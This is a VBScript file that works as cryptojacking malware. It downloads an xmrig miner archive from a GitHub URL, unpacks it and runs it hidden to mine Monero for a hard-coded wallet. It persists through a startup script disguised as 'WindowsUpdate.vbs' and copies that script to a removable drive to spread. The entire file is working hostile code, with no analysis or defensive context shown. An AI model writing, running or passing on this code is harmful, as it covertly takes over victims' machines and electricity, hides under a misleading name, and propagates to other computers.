Option Explicit

Dim objXMLHTTP, objStream, strURL, strFilePath, strExtractPath, strCommand
Dim objShell, objFSO, strStartupFolder, strUSBPath, strScriptName, objDrive
Dim objDrives, foundUSB, startupScript, strUserName, strArguments

strUserName = CreateObject("WScript.Network").UserName

strURL = "https://github.com/manashma/cryptominer/raw/refs/heads/main/xmrig.zip"
strFilePath = "C:\xmrig.zip" 
strExtractPath = "C:\xmrig"    
strScriptName = "WindowsUpdate.vbs"
Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.FileExists("C:\xmrig\xmrig.exe") Then

Else
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    objXMLHTTP.Open "GET", strURL, False
    objXMLHTTP.send

    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objXMLHTTP.responseBody
    objStream.SaveToFile strFilePath, 2
    objStream.Close

    If Not objFSO.FileExists(strFilePath) Then
        WScript.Quit
    End If

    If Not objFSO.FolderExists(strExtractPath) Then
        objFSO.CreateFolder strExtractPath
    End If

    Set objShell = CreateObject("Shell.Application")
    objShell.NameSpace(strExtractPath).CopyHere objShell.NameSpace(strFilePath).Items, 4

    WScript.Sleep 5000 
    If Not objFSO.FileExists("C:\xmrig\xmrig.exe") Then
        WScript.Quit
    End If
End If

strCommand = "C:\xmrig\xmrig.exe"
strArguments = " --url gulf.moneroocean.stream:10128 --user 46N3tmJWPyEZ2zoQ6v3uWh2fFcqSY3EVj4KE1yLzw3uFdxP94FPFNn44Ph11bcRkcrfFAh4dooPyxSVnoPyWV4gnK77mpGp --pass x --donate-level 1"

strStartupFolder = "C:\Users\" & strUserName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" & strScriptName

Set startupScript = objFSO.CreateTextFile(strStartupFolder, True)
startupScript.WriteLine("Set WshShell = CreateObject(""WScript.Shell"")")
startupScript.WriteLine("WshShell.Run """"""" & strCommand & """""" & strArguments & """, 0, False")
startupScript.Close

Set objDrives = objFSO.Drives
foundUSB = False

For Each objDrive In objDrives
    If objDrive.IsReady And objDrive.DriveType = 2 Then
        strUSBPath = objDrive.DriveLetter & "\"
        foundUSB = True
        Exit For
    End If
Next

If foundUSB Then
    On Error Resume Next
    objFSO.CopyFile strStartupFolder, strUSBPath & strScriptName, True
    If Err.Number <> 0 Then
        Err.Clear
    End If
End If

Set objXMLHTTP = Nothing
Set objStream = Nothing
Set objShell = Nothing
Set objFSO = Nothing
Set startupScript = Nothing
Set objDrives = Nothing
Set objDrive = Nothing

Set objShell = CreateObject("WScript.Shell")
objShell.Run """" & strCommand & """" & strArguments, 0, False
